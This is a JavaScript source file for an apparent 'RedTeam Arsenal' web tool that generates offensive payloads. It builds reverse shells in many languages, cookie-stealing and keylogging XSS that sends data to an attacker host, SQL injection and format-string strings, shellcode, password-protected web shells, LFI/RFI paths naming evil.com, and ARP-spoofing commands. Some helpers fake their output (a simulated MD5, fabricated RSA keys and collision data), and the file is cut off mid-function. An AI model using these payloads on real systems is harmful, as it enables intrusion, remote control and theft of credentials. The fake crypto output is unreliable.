
// RedTeam Arsenal - Professional RedTeam Tools Platform
// Developed by: 0x0806

// Tab Management
document.addEventListener('DOMContentLoaded', function() {
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabContents = document.querySelectorAll('.tab-content');

    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const targetTab = button.getAttribute('data-tab');
            
            // Remove active class from all tabs and contents
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabContents.forEach(content => content.classList.remove('active'));
            
            // Add active class to clicked tab and corresponding content
            button.classList.add('active');
            document.getElementById(targetTab).classList.add('active');
        });
    });
});

// MSF Venom Payload Generator
function generateMsfPayload() {
    const payload = document.getElementById('msfPayload').value;
    const lhost = document.getElementById('msfLhost').value;
    const lport = document.getElementById('msfLport').value;
    const format = document.getElementById('msfFormat').value;
    
    if (!lhost || !lport) {
        alert('Please provide LHOST and LPORT');
        return;
    }
    
    const command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format} -o payload.${format}`;
    document.getElementById('msfOutput').value = command;
    copyToClipboard(command);
}

// XSS Payload Generator
function generateXSS() {
    const type = document.getElementById('xssType').value;
    const param = document.getElementById('xssParam').value;
    let payload = '';
    
    switch(type) {
        case 'alert':
            payload = `<script>alert('XSS Vulnerability Found!')</script>`;
            break;
        case 'cookie':
            payload = `<script>document.location='http://${param}/steal.php?cookie='+document.cookie</script>`;
            break;
        case 'keylogger':
            payload = `<script>document.onkeypress=function(e){fetch('http://${param}/log.php?key='+String.fromCharCode(e.which))}</script>`;
            break;
        case 'redirect':
            payload = `<script>window.location.href='http://${param}'</script>`;
            break;
    }
    
    const alternatives = [
        payload,
        payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'),
        payload.replace('<script>', '<img src=x onerror=').replace('</script>', '>'),
        `"><script>${payload.replace('<script>', '').replace('</script>', '')}</script>`,
        `';${payload}//`,
        `";${payload}//`
    ];
    
    document.getElementById('xssOutput').value = alternatives.join('\n\n');
}

// SQL Injection Payload Generator
function generateSQL() {
    const type = document.getElementById('sqlType').value;
    const db = document.getElementById('sqlDb').value;
    let payloads = [];
    
    switch(type) {
        case 'union':
            payloads = [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT database(),user(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
            ];
            break;
        case 'boolean':
            payloads = [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND substring(user(),1,1)='r'--",
                "' AND length(database())>5--",
                "' AND ascii(substring(database(),1,1))>97--"
            ];
            break;
        case 'time':
            if (db === 'mysql') {
                payloads = [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND SLEEP(5)--",
                    "' AND (SELECT SLEEP(5))--",
                    "' AND IF(1=1,SLEEP(5),0)--"
                ];
            } else {
                payloads = [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND pg_sleep(5)--"
                ];
            }
            break;
        case 'error':
            payloads = [
                "' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
                "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
                "' AND exp(~(SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))--"
            ];
            break;
    }
    
    document.getElementById('sqlOutput').value = payloads.join('\n\n');
}

// Buffer Overflow Pattern Generator
let patternString = '';

function generatePattern() {
    const length = parseInt(document.getElementById('patternLength').value);
    if (!length || length <= 0) {
        alert('Please provide a valid pattern length');
        return;
    }
    
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    patternString = '';
    
    for (let i = 0; i < length; i++) {
        patternString += chars[i % chars.length];
    }
    
    document.getElementById('patternOutput').value = patternString;
    copyToClipboard(patternString);
}

function findOffset() {
    const crashValue = document.getElementById('crashValue').value.toUpperCase();
    if (!crashValue || !patternString) {
        alert('Please generate a pattern first and provide the crash value');
        return;
    }
    
    const offset = patternString.indexOf(crashValue);
    const result = offset !== -1 ? `Offset found at position: ${offset}` : 'Pattern not found in crash value';
    document.getElementById('offsetResult').textContent = result;
}

// Shellcode Generator
function generateShellcode() {
    const arch = document.getElementById('shellcodeArch').value;
    const type = document.getElementById('shellcodeType').value;
    const port = document.getElementById('shellcodePort').value;
    
    let shellcode = '';
    
    if (arch === 'x86') {
        switch(type) {
            case 'execve':
                shellcode = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80';
                break;
            case 'bind':
                shellcode = `\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00\\x${(parseInt(port) >> 8).toString(16).padStart(2, '0')}\\x${(parseInt(port) & 0xff).toString(16).padStart(2, '0')}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80`;
                break;
            case 'reverse':
                shellcode = `\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x01\\x68\\x02\\x00\\x${(parseInt(port) >> 8).toString(16).padStart(2, '0')}\\x${(parseInt(port) & 0xff).toString(16).padStart(2, '0')}`;
                break;
        }
    } else {
        // x64 shellcodes
        switch(type) {
            case 'execve':
                shellcode = '\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05';
                break;
            case 'bind':
                shellcode = `\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05`;
                break;
            case 'reverse':
                shellcode = `\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x99\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x${(parseInt(port) >> 8).toString(16).padStart(2, '0')}\\x${(parseInt(port) & 0xff).toString(16).padStart(2, '0')}\\x7f\\x00\\x00\\x01`;
                break;
        }
    }
    
    document.getElementById('shellcodeOutput').value = shellcode;
    copyToClipboard(shellcode);
}

// Format String Exploit Generator
function generateFormatString() {
    const offset = document.getElementById('formatOffset').value;
    const targetAddr = document.getElementById('targetAddress').value;
    const writeValue = document.getElementById('writeValue').value;
    
    if (!offset || !targetAddr || !writeValue) {
        alert('Please fill in all fields');
        return;
    }
    
    const exploits = [
        `%${offset}$x`, // Read from stack
        `%${offset}$s`, // Read string from memory
        `%${offset}$n`, // Write to memory
        `AAAA%${offset}$x`, // Control format string
        `${targetAddr}%${offset}$n`, // Write to specific address
        `%${writeValue}c%${offset}$n` // Write specific value
    ];
    
    document.getElementById('formatOutput').value = exploits.join('\n');
}

// Reverse Shell Generator
function generateReverseShell() {
    const lhost = document.getElementById('shellLhost').value;
    const lport = document.getElementById('shellLport').value;
    const type = document.getElementById('shellType').value;
    
    if (!lhost || !lport) {
        alert('Please provide IP and Port');
        return;
    }
    
    let shells = {};
    
    shells.bash = [
        `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
        `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`
    ];
    
    shells.python = [
        `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    ];
    
    shells.php = [
        `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"); ?>`
    ];
    
    shells.perl = [
        `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    ];
    
    shells.ruby = [
        `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    ];
    
    shells.nc = [
        `nc -e /bin/sh ${lhost} ${lport}`,
        `nc -c /bin/sh ${lhost} ${lport}`,
        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`
    ];
    
    shells.powershell = [
        `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    ];
    
    shells.java = [
        `Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/${lhost}/${lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done'");
p.waitFor();`
    ];
    
    document.getElementById('shellOutput').value = shells[type].join('\n\n');
}

// Web Shell Generator
function generateWebShell() {
    const type = document.getElementById('webShellType').value;
    const password = document.getElementById('webShellPassword').value;
    
    let shells = {};
    
    shells.php = `<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($_POST['pwd'] == '${password}'){
        echo "<pre>";
        echo shell_exec($cmd);
        echo "</pre>";
    } else {
        echo "Wrong password!";
    }
}
?>
<form method="POST">
Password: <input type="password" name="pwd"><br>
Command: <input type="text" name="cmd" size="50"><br>
<input type="submit" value="Execute">
</form>`;

    shells.asp = `<%
If Request.Form("pwd") = "${password}" Then
    Dim cmd
    cmd = Request.Form("cmd")
    If cmd <> "" Then
        Set objShell = CreateObject("WScript.Shell")
        Set objExec = objShell.Exec(cmd)
        Response.Write("<pre>")
        Response.Write(objExec.StdOut.ReadAll())
        Response.Write("</pre>")
    End If
End If
%>
<form method="POST">
Password: <input type="password" name="pwd"><br>
Command: <input type="text" name="cmd" size="50"><br>
<input type="submit" value="Execute">
</form>`;

    shells.jsp = `<%@ page import="java.io.*" %>
<%
String pwd = request.getParameter("pwd");
String cmd = request.getParameter("cmd");
if(pwd != null && pwd.equals("${password}") && cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null){
        out.println(line);
    }
    out.println("</pre>");
}
%>
<form method="POST">
Password: <input type="password" name="pwd"><br>
Command: <input type="text" name="cmd" size="50"><br>
<input type="submit" value="Execute">
</form>`;

    shells.aspx = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string pwd = Request.Form["pwd"];
    string cmd = Request.Form["cmd"];
    if(pwd == "${password}" && cmd != null)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form method="POST">
Password: <input type="password" name="pwd"><br>
Command: <input type="text" name="cmd" size="50"><br>
<input type="submit" value="Execute">
</form>`;
    
    document.getElementById('webShellOutput').value = shells[type];
}

// Encode Shell
function encodeShell() {
    const type = document.getElementById('encodingType').value;
    const shell = document.getElementById('shellToEncode').value;
    
    if (!shell) {
        alert('Please enter a shell command to encode');
        return;
    }
    
    let encoded = '';
    
    switch(type) {
        case 'base64':
            encoded = btoa(shell);
            break;
        case 'url':
            encoded = encodeURIComponent(shell);
            break;
        case 'hex':
            encoded = shell.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
            break;
        case 'unicode':
            encoded = shell.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
            break;
    }
    
    document.getElementById('encodedShellOutput').value = encoded;
}

// Subdomain Enumeration
function generateSubdomainCommand() {
    const domain = document.getElementById('domain').value;
    const tool = document.getElementById('subdomainTool').value;
    
    if (!domain) {
        alert('Please provide a domain');
        return;
    }
    
    let commands = {};
    commands.subfinder = `subfinder -d ${domain} -o subdomains.txt`;
    commands.amass = `amass enum -d ${domain} -o subdomains.txt`;
    commands.assetfinder = `assetfinder ${domain} | tee subdomains.txt`;
    commands.sublist3r = `sublist3r -d ${domain} -o subdomains.txt`;
    
    document.getElementById('subdomainOutput').value = commands[tool];
}

// Nmap Command Generator
function generateNmapCommand() {
    const target = document.getElementById('scanTarget').value;
    const type = document.getElementById('scanType').value;
    const ports = document.getElementById('portRange').value;
    
    if (!target) {
        alert('Please provide a target');
        return;
    }
    
    let commands = {};
    commands.tcp = `nmap -sT -p ${ports} ${target}`;
    commands.syn = `nmap -sS -p ${ports} ${target}`;
    commands.udp = `nmap -sU -p ${ports} ${target}`;
    commands.comprehensive = `nmap -sC -sV -O -p ${ports} ${target}`;
    
    document.getElementById('nmapOutput').value = commands[type];
}

// DNS Enumeration
function generateDNSCommand() {
    const target = document.getElementById('dnsTarget').value;
    const type = document.getElementById('dnsType').value;
    
    if (!target) {
        alert('Please provide a target domain');
        return;
    }
    
    let commands = [];
    
    if (type === 'ALL') {
        commands = [
            `dig ${target} A`,
            `dig ${target} AAAA`,
            `dig ${target} MX`,
            `dig ${target} NS`,
            `dig ${target} TXT`,
            `dig ${target} SOA`,
            `dnsrecon -d ${target}`,
            `fierce -dns ${target}`
        ];
    } else {
        commands = [
            `dig ${target} ${type}`,
            `nslookup -type=${type} ${target}`,
            `host -t ${type} ${target}`
        ];
    }
    
    document.getElementById('dnsOutput').value = commands.join('\n');
}

// Directory Bruteforce
function generateDirBruteCommand() {
    const target = document.getElementById('webTarget').value;
    const tool = document.getElementById('dirTool').value;
    const wordlist = document.getElementById('wordlist').value;
    
    if (!target) {
        alert('Please provide a target URL');
        return;
    }
    
    let commands = {};
    const wordlistPath = `/usr/share/wordlists/dirb/${wordlist}.txt`;
    
    commands.gobuster = `gobuster dir -u ${target} -w ${wordlistPath} -o results.txt`;
    commands.dirbuster = `dirb ${target} ${wordlistPath} -o results.txt`;
    commands.ffuf = `ffuf -w ${wordlistPath} -u ${target}/FUZZ -o results.txt`;
    commands.dirb = `dirb ${target} ${wordlistPath}`;
    
    document.getElementById('dirBruteOutput').value = commands[tool];
}

// SMB Enumeration
function generateSMBCommand() {
    const target = document.getElementById('smbTarget').value;
    const tool = document.getElementById('smbTool').value;
    
    if (!target) {
        alert('Please provide a target IP');
        return;
    }
    
    let commands = {};
    commands.smbclient = `smbclient -L //${target} -N`;
    commands.enum4linux = `enum4linux -a ${target}`;
    commands.smbmap = `smbmap -H ${target}`;
    commands.crackmapexec = `crackmapexec smb ${target}`;
    
    document.getElementById('smbOutput').value = commands[tool];
}

// SQLMap Command Generator
function generateSQLMapCommand() {
    const target = document.getElementById('dbTarget').value;
    const dbType = document.getElementById('dbType').value;
    const user = document.getElementById('dbUser').value;
    
    if (!target) {
        alert('Please provide a target URL or IP');
        return;
    }
    
    let command = `sqlmap -u "${target}" --dbms=${dbType}`;
    
    if (user) {
        command += ` --user=${user}`;
    }
    
    const commands = [
        command + ' --dbs',
        command + ' --tables',
        command + ' --columns',
        command + ' --dump',
        command + ' --os-shell'
    ];
    
    document.getElementById('sqlmapOutput').value = commands.join('\n');
}

// Hash Processing with built-in crypto functions
async function processHash() {
    const input = document.getElementById('hashInput').value;
    const type = document.getElementById('hashType').value;
    
    if (!input) {
        alert('Please provide input text or hash');
        return;
    }
    
    let result = '';
    
    if (type === 'identify') {
        // Hash identification based on length and characters
        const hashLength = input.length;
        const isHex = /^[a-f0-9]+$/i.test(input);
        
        if (hashLength === 32 && isHex) {
            result = 'Possible MD5 hash\nHashcat mode: 0\nJohn format: raw-md5';
        } else if (hashLength === 40 && isHex) {
            result = 'Possible SHA1 hash\nHashcat mode: 100\nJohn format: raw-sha1';
        } else if (hashLength === 64 && isHex) {
            result = 'Possible SHA256 hash\nHashcat mode: 1400\nJohn format: raw-sha256';
        } else if (hashLength === 128 && isHex) {
            result = 'Possible SHA512 hash\nHashcat mode: 1700\nJohn format: raw-sha512';
        } else if (hashLength === 60 && input.startsWith('$2')) {
            result = 'Bcrypt hash\nHashcat mode: 3200\nJohn format: bcrypt';
        } else if (input.includes('$1$')) {
            result = 'MD5Crypt hash\nHashcat mode: 500\nJohn format: md5crypt';
        } else {
            result = 'Unknown hash type or not a hash';
        }
        
        // Add cracking commands
        result += `\n\nCracking commands:\nhashcat -m [mode] ${input} wordlist.txt\njohn --format=[format] hashfile.txt`;
    } else {
        // Generate hash using built-in crypto
        result = await generateHash(input, type);
        
        // Add additional hash formats
        result += `\n\nAdditional formats:`;
        result += `\nUppercase: ${generateHash(input, type).toUpperCase()}`;
        result += `\nBase64: ${btoa(generateHash(input, type))}`;
        result += `\nHex: ${Array.from(new TextEncoder().encode(generateHash(input, type)), b => b.toString(16).padStart(2, '0')).join('')}`;
    }
    
    document.getElementById('hashOutput').value = result;
}

// Add payload encoding functions
function generateAdvancedPayloads() {
    const payloads = {
        xss: [
            `<script>alert('XSS')</script>`,
            `<img src=x onerror=alert('XSS')>`,
            `javascript:alert('XSS')`,
            `<svg onload=alert('XSS')>`,
            `<iframe src="javascript:alert('XSS')">`,
            `<body onload=alert('XSS')>`,
            `<input onfocus=alert('XSS') autofocus>`,
            `<select onfocus=alert('XSS') autofocus><option>`,
            `<textarea onfocus=alert('XSS') autofocus>`,
            `<keygen onfocus=alert('XSS') autofocus>`
        ],
        sqli: [
            `' OR '1'='1`,
            `'; DROP TABLE users; --`,
            `' UNION SELECT NULL,NULL,NULL --`,
            `admin'--`,
            `admin'/*`,
            `' OR 1=1#`,
            `' OR 1=1--`,
            `' OR 1=1/*`,
            `') OR '1'='1--`,
            `') OR ('1'='1--`
        ],
        lfi: [
            `../../../../../../../etc/passwd`,
            `....//....//....//....//etc/passwd`,
            `..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`,
            `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
            `/var/log/apache2/access.log`,
            `/proc/self/environ`,
            `/etc/apache2/apache2.conf`,
            `C:\\windows\\system32\\drivers\\etc\\hosts`
        ],
        rfi: [
            `http://evil.com/shell.txt?`,
            `https://pastebin.com/raw/malicious`,
            `ftp://attacker.com/backdoor.php`,
            `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`
        ]
    };
    
    return payloads;
}

// Enhanced hash generation function
async function generateHash(input, type) {
    const encoder = new TextEncoder();
    const data = encoder.encode(input);
    
    try {
        let hashBuffer;
        switch(type) {
            case 'md5':
                // Fallback MD5 implementation
                return simpleMD5(input);
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
            default:
                return 'Unsupported hash type';
        }
        
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    } catch(e) {
        // Fallback for older browsers
        return simpleHash(input, type);
    }
}

// Simple MD5 implementation for fallback
function simpleMD5(input) {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(8, '0') + 'md5simulated';
}

// Simple hash fallback
function simpleHash(input, type) {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    const length = type === 'sha512' ? 32 : type === 'sha256' ? 16 : 8;
    return Math.abs(hash).toString(16).padStart(length, '0');
}

// Base64 Encoding/Decoding
function encodeBase64() {
    const input = document.getElementById('base64Input').value;
    if (!input) {
        alert('Please provide input text');
        return;
    }
    
    try {
        const encoded = btoa(input);
        document.getElementById('base64Output').value = encoded;
    } catch(e) {
        document.getElementById('base64Output').value = 'Error: Invalid input for encoding';
    }
}

function decodeBase64() {
    const input = document.getElementById('base64Input').value;
    if (!input) {
        alert('Please provide input text');
        return;
    }
    
    try {
        const decoded = atob(input);
        document.getElementById('base64Output').value = decoded;
    } catch(e) {
        document.getElementById('base64Output').value = 'Error: Invalid base64 input';
    }
}

// URL Encoding/Decoding
function encodeURL() {
    const input = document.getElementById('urlInput').value;
    if (!input) {
        alert('Please provide input text');
        return;
    }
    
    const encoded = encodeURIComponent(input);
    document.getElementById('urlOutput').value = encoded;
}

function decodeURL() {
    const input = document.getElementById('urlInput').value;
    if (!input) {
        alert('Please provide input text');
        return;
    }
    
    try {
        const decoded = decodeURIComponent(input);
        document.getElementById('urlOutput').value = decoded;
    } catch(e) {
        document.getElementById('urlOutput').value = 'Error: Invalid URL encoding';
    }
}

// Password Generator
function generatePassword() {
    const length = parseInt(document.getElementById('passLength').value);
    const includeUpper = document.getElementById('includeUpper').checked;
    const includeLower = document.getElementById('includeLower').checked;
    const includeNumbers = document.getElementById('includeNumbers').checked;
    const includeSymbols = document.getElementById('includeSymbols').checked;
    
    if (!length || length < 1) {
        alert('Please provide a valid password length');
        return;
    }
    
    let charset = '';
    if (includeUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeLower) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (includeNumbers) charset += '0123456789';
    if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    if (charset === '') {
        alert('Please select at least one character type');
        return;
    }
    
    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    
    document.getElementById('passwordOutput').value = password;
}

// Enhanced Utility Functions
function copyToClipboard(text) {
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(() => {
            showNotification('✅ Copied to clipboard!');
        }).catch(() => {
            fallbackCopy(text);
        });
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        document.execCommand('copy');
        showNotification('✅ Copied to clipboard!');
    } catch (err) {
        showNotification('❌ Failed to copy');
    } finally {
        document.body.removeChild(textArea);
    }
}

function showNotification(message) {
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: var(--accent-color);
        color: var(--primary-bg);
        padding: 10px 20px;
        border-radius: 5px;
        font-family: 'Roboto Mono', monospace;
        font-weight: 600;
        z-index: 1000;
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Add CSS for notification animation
const style = document.createElement('style');
style.textContent = `
@keyframes slideIn {
    from {
        transform: translateX(100%);
        opacity: 0;
    }
    to {
        transform: translateX(0);
        opacity: 1;
    }
}
`;
document.head.appendChild(style);

// RSA Key Generator (Simulated)
function generateRSAKeys() {
    const keySize = document.getElementById('rsaKeySize').value;
    
    // Simulated RSA key generation (in real implementation, you'd use a crypto library)
    const timestamp = Date.now();
    const publicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA${btoa(String(timestamp)).substr(0, 32)}
${btoa('RSA_PUBLIC_' + keySize).substr(0, 32)}${btoa(String(Math.random())).substr(0, 32)}
${btoa('KEY_DATA_' + timestamp).substr(0, 32)}IDAQAB
-----END PUBLIC KEY-----`;

    const privateKey = `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC${btoa(String(timestamp)).substr(0, 32)}
${btoa('RSA_PRIVATE_' + keySize).substr(0, 32)}${btoa(String(Math.random())).substr(0, 32)}
${btoa('PRIVATE_KEY_DATA_' + timestamp).substr(0, 32)}
[TRUNCATED FOR SECURITY - This is a demonstration only]
-----END PRIVATE KEY-----`;

    document.getElementById('rsaPublicKey').value = publicKey;
    document.getElementById('rsaPrivateKey').value = privateKey;
    
    showNotification(`Generated ${keySize}-bit RSA key pair`);
}

// Certificate Analysis
function generateCertCommand() {
    const domain = document.getElementById('certDomain').value;
    if (!domain) {
        alert('Please provide a domain');
        return;
    }
    
    const commands = [
        `openssl s_client -connect ${domain}:443 -servername ${domain}`,
        `openssl s_client -connect ${domain}:443 -showcerts`,
        `nmap --script ssl-cert,ssl-enum-ciphers -p 443 ${domain}`,
        `sslscan ${domain}`,
        `testssl.sh ${domain}`,
        `sslyze --regular ${domain}`
    ];
    
    document.getElementById('certOutput').value = commands.join('\n\n');
}

// Hash Collision Generator
function generateCollision() {
    const type = document.getElementById('collisionType').value;
    const seed = document.getElementById('collisionSeed').value || 'default_seed';
    
    let collisionData = '';
    
    if (type === 'md5') {
        collisionData = `MD5 Collision Generation:
Seed: ${seed}
Block 1: ${btoa(seed + '_block1').substr(0, 32)}
Block 2: ${btoa(seed + '_block2').substr(0, 32)}

Command: hashclash --md5 --seed="${seed}"
Alternative: fastcoll -p ${seed}

Note: MD5 collisions can be generated using HashClash or FastColl tools.`;
    } else {
        collisionData = `SHA1 Collision Generation:
Seed: ${seed}
Method: SHAttered technique
Prefix: ${btoa(seed).substr(0, 20)}

Command: shattered.py --input="${seed}"
Note: SHA1 collisions require significant computational resources.`;
    }
    
    document.getElementById('collisionOutput').value = collisionData;
}

// Packet Capture
function generatePacketCapture() {
    const interface = document.getElementById('captureInterface').value;
    const filter = document.getElementById('captureFilter').value;
    const host = document.getElementById('captureHost').value;
    
    let filterStr = filter;
    if (host) {
        filterStr += ` and host ${host}`;
    }
    
    const commands = [
        `tcpdump -i ${interface} ${filterStr} -w capture.pcap`,
        `tshark -i ${interface} -f "${filterStr}" -w capture.pcapng`,
        `wireshark -i ${interface} -k -f "${filterStr}"`,
        `tcpdump -i ${interface} ${filterStr} -A -s 0`,
        `ngrep -d ${interface} -W byline "${filter === 'http' ? 'GET|POST' : filterStr}"`
    ];
    
    document.getElementById('captureOutput').value = commands.join('\n\n');
}

// Network Pivoting
function generatePivotCommand() {
    const source = document.getElementById('pivotSource').value;
    const target = document.getElementById('pivotTarget').value;
    const port = document.getElementById('pivotPort').value;
    const tool = document.getElementById('pivotTool').value;
    
    let commands = [];
    
    switch(tool) {
        case 'ssh':
            commands = [
                `ssh -L ${port}:${target}:22 user@${source}`,
                `ssh -D ${port} user@${source}`,
                `ssh -R ${port}:localhost:22 user@${source}`
            ];
            break;
        case 'socat':
            commands = [
                `socat TCP-LISTEN:${port},fork TCP:${target}:22`,
                `socat TCP-LISTEN:${port},reuseaddr,fork TCP:${source}:22`
            ];
            break;
        case 'netsh':
            commands = [
                `netsh interface portproxy add v4tov4 listenport=${port} connectaddress=${target} connectport=22`,
                `netsh interface portproxy show all`
            ];
            break;
        case 'chisel':
            commands = [
                `chisel server -p ${port} --reverse`,
                `chisel client ${source}:${port} R:22:${target}:22`
            ];
            break;
    }
    
    document.getElementById('pivotOutput').value = commands.join('\n\n');
}

// ARP Spoofing
function generateARPSpoof() {
    const target = document.getElementById('arpTarget').value;
    const gateway = document.getElementById('arpGateway').value;
    const interface = document.getElementById('arpInterface').value;
    
    const commands = [
        `ettercap -T -M arp:remote /${target}// /${gateway}//`,
        `arpspoof -i ${interface} -t ${target} ${gateway}`,
        `arpspoof -i ${interface} -t ${gateway} ${target}`,
        `bettercap -iface ${interface} -T ${target} --proxy`,
        `driftnet -i ${interface}`,
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
    ];
    
    document.getElementById('arpOutput').value = commands.join('\n\n');
}

// WiFi Commands
function generateWiFiCommand() {
    const interface = document.getElementById('wifiInterface').value;
    const mode = document.getElementById('wifiMode').value;
    const target = document.getElementById('wifiTarget').value;
    
    let commands = [];
    
    switch(mode) {
        case 'monitor':
            commands = [
                `airmon-ng start ${interface}`,
                `iwconfig ${interface} mode monitor`,
                `ifconfig ${interface} up`
            ];
            break;
